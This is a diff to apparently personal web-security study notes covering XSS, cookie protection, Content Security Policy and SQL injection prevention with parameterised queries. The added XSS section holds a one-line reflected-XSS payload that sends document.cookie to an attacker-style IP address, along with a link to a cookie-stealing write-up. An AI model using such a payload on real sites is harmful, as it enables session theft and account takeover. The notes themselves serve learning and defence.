@@ -85,6 +85,8 @@ codes begin with 5: server's end, eg programming error, script not working prope
 
 
 # Cross-site scripting (XSS) 
+https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md 
+`<script>var i=new Image;i.src="http://192.168.0.18:8888/?"+document.cookie;</script>`
 
 ## Cookies 
 - how would you design a system where multiple webpages need authentication with a common set of credentials?
@@ -123,7 +125,19 @@ fetch("https://gmail.com")
 - encode data (eg HTML encoding[https://emn178.github.io/online-tools/html_encode.html], JavaScript encoding) on output, so browser knows which part of html to not execute. using wrong encoding scheme for the context can lead to bypasses 
 - set sensitive cookies to HttpOnly so they are not accessible directly by JavaScript. prevents stealing the cookie directly, but still lets attackers do what they want as the user under the origin
 - Content Security Policy (http header in http response): tell the browser that browser should only execute certain scripts (eg loaded remotely from particular domains / follow particular format / have particular content)
-- 
+
+# SQL injection
+- web applications will often have to retrieve data from a database, which often depends on data provided by the user eg retrieving product's details based on ID supplied by user, logging in with username and password
+
+## how to prevent SQL injection 
+- root cause of SQL injection is concatenating user input directly with user commands. SQL server cannot tell which is which
+- solution: parameterised queries; put placeholders in the query where user data should go and pass in the user data separately at execution time. this way server can differentiate between the two
+
+# Command injection 
+
+
+# Path traversal 
+
 
 
 
